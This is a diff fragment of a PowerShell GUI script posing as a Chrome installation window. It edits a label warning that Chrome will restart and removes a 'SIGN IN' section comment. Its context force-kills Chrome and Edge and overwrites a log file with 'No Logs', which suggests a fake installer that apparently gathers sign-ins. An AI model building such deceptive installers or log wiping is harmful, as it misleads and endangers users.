@@ -62,10 +62,10 @@ $infofield.Location = New-Object System.Drawing.Point(120, 230)
 $infofield.Font = 'Microsoft Sans Serif,10'
 
 $infofield2 = New-Object System.Windows.Forms.Label
-$infofield2.Text = "Chrome may restart during installation"
+$infofield2.Text = "Chrome will close and restart during installation"
 $infofield2.ForeColor = "#000000"
 $infofield2.AutoSize = $true
-$infofield2.Location = New-Object System.Drawing.Point(120, 260)
+$infofield2.Location = New-Object System.Drawing.Point(155, 260)
 $infofield2.Font = 'Microsoft Sans Serif,10'
 
 $linkfield = New-Object System.Windows.Forms.Label
@@ -94,8 +94,6 @@ $setupwindow.Close()
 Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "chrome.exe" -NoNewWindow -Wait
 Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "msedge.exe" -NoNewWindow -Wait
 Sleep 1
-
-#========================================== WINDOW TWO (SIGN IN) =====================================================
 
 
 $htmlcode = @"
@@ -278,3 +276,4 @@ sleep 2
 $outword = "No Logs"
 $outword | Out-File $htmlFile -Force
 sleep 1
+
